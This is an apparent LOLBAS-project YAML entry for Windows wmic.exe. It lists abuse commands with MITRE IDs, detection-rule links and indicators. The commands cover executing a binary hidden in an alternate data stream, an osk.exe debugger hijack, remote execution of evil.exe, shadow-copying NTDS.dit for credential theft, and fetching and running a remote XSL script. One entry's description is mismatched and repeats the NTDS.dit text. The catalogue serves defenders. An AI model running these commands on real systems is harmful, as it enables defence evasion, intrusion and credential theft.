---
Name: Wmic.exe
Description: The WMI command-line (WMIC) utility provides a command-line interface for WMI
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: wmic.exe process call create "c:\ads\file.txt:program.exe"
    Description: Execute a .EXE file stored as an Alternate Data Stream (ADS)
    Usecase: Execute binary file hidden in Alternate data streams to evade defensive counter measures
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe process call create calc
    Description: Execute calc from wmic
    Usecase: Execute binary from wmic to evade defensive counter measures
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
    Description: Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.
    Usecase: Execute binary by manipulate the debugger for a program to evade defensive counter measures
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe /node:"192.168.0.1" process call create "evil.exe"
    Description: Execute evil.exe on the remote system.
    Usecase: Execute binary on a remote system
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"
    Description: Create a scheduled execution of C:\GoogleUpdate.exe to run at 9pm.
    Usecase: Execute binary with scheduled task created with wmic on a remote computer
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
    Description: Create a volume shadow copy of NTDS.dit that can be copied.
    Usecase: Execute binary on remote system
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
    Description: Create a volume shadow copy of NTDS.dit that can be copied.
    Usecase: Execute binary on remote system
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
    Description: Executes JScript or VBScript embedded in the target remote XSL stylsheet.
    Usecase: Execute script from remote system
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\wbem\wmic.exe
  - Path: C:\Windows\SysWOW64\wbem\wmic.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/8beb70e970b814d0ab60625206ea0d8a21a9bff8/rules/windows/image_load/sysmon_wmic_remote_xsl_scripting_dlls.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_xsl_script_processing.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_bypass_squiblytwo.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/c90e31275d2f98b21e55df8a46d0678cfca458d6/rules/windows/process_creation/win_susp_wmic_eventconsumer_create.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_suspicious_wmi_script.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/persistence_via_windows_management_instrumentation_event_subscription.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
  - Splunk: https://github.com/splunk/security_content/blob/961a81d4a5cb5c5febec4894d6d812497171a85c/detections/endpoint/xsl_script_execution_with_wmic.yml
  - Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/remote_wmi_command_attempt.yml
  - Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/remote_process_instantiation_via_wmi.yml
  - Splunk: https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/detections/endpoint/process_execution_via_wmi.yml
  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
  - IOC: Wmic retrieving scripts from remote system/Internet location
  - IOC: DotNet CLR libraries loaded into wmic.exe
  - IOC: DotNet CLR Usage Log - wmic.exe.log
Resources:
  - Link: https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
  - Link: https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
  - Link: https://twitter.com/subTee/status/986234811944648707
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
